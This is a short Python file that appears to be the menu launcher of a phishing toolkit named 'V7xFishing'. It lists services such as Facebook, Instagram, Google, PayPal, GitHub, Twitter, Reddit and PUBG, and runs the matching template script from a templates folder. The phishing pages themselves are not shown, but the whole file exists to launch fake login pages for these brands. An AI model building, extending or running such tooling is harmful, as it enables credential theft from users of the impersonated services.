import os
from Graphics import Gr

class main(Gr):
	def __init__(self):
		try:
			print (self.list_main())
			self.Functions()
		except KeyboardInterrupt:
			exit()

	def FunctionsRun(self,NameFunction):
		os.chdir('templates/%s'%NameFunction)
		os.system('python3 main')

	def Functions(self):
		user = input('\033[1;33m >   \033[1;37m').replace(' ','')
		print('')
		V7xFishing = {
		1:'Fasebook',
		2:'Instagram',
		3:'One',
		4:'Google',
		5:'Paypal',
		6:'Instafollowers',
		7:'Github',
		8:'Yahoo',
		9:'Wordpress',
		10:'Twitter',
		11:'Reddit',
		12:'pubg',
		13:'Clash',
		14:'',
		15:'',
					}
		self.FunctionsRun(V7xFishing[int(user)])


if __name__ == '__main__':
	main()
